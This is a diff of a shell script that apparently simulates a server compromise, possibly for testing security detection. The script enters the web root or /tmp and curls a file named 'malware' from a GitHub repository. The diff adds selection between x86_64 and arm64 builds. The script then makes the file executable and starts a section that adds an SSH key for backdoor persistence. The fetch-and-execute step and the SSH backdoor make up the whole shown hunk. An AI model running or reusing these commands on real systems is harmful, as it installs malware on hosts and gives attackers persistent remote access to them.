@@ -4,11 +4,15 @@ set -e
 cd /var/www/html 2>/dev/null || cd /tmp
 
 # Download file using curl
-curl -O https://raw.githubusercontent.com/safchain/dd-malware/main/malware.x64
+if [ "$(uname -m)" = "x86_64" ]; then
+    curl -o malware https://raw.githubusercontent.com/safchain/dd-malware/main/malware.x64
+else
+    curl -o malware https://raw.githubusercontent.com/safchain/dd-malware/main/malware.arm64
+fi
 
 # Make the file executable
-chmod +x malware.x64
-MALWARE_PATH="$(pwd)/malware.x64"
+chmod +x malware
+MALWARE_PATH="$(pwd)/malware"
 
 # Persistence: Add SSH key for backdoor access 
 mkdir -p ~/.ssh 2>/dev/null || true
